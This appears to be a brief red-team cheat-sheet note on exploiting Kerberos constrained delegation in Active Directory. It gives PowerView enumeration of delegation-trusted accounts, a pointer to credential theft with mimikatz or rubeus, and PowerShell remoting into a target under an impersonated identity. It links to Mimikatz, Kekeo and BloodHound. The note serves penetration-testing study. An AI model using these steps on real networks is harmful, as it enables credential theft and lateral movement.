# Exploiting Constrained Delegation
```powershell
Get-NetUser -TrustedToAuth # Powerview module to get service accounts trusted to authenticate users to services. (Accounts that can request a TGT)
# Use mimikatz or rubeus to get credentials for this user

# Begin a remote powershell session on a target machine (tickets should be in memory for an impersonated user delegating WSMAN and HTTP authority)
$username = “<USERNAME>”  
$password = “<PASSWORD>”  
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force  
$cred = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
New-PSSession -ComputerName <remote server name>
Enter-PSSession -ComputerName <remote server name>
```
- [[Mimikatz]]
- [[PowerView]]
- [[Kekeo]]
- [[BloodHound]]
